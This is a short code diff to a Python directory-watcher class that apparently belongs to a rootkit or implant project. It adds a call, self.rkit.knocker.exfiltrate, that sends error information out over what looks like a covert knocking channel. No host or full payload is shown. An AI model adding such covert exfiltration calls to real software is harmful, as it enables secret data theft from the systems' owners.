@@ -3,7 +3,7 @@ import MonitorDir
 
 
 class directory_watcher:
-    def __init__(self, rkit="", directory=""):
+    def __init__(self, rkit, directory=""):
         self.directory = directory
         self.rkit = rkit
         self.my_event_handler = None
@@ -26,6 +26,7 @@ class directory_watcher:
                 return "Watch Started"
             return "Watch already started"
         except FileNotFoundError:
+            self.rkit.knocker.exfiltrate("File not found", "/")
             return "File not found"
 
     def stop(self):
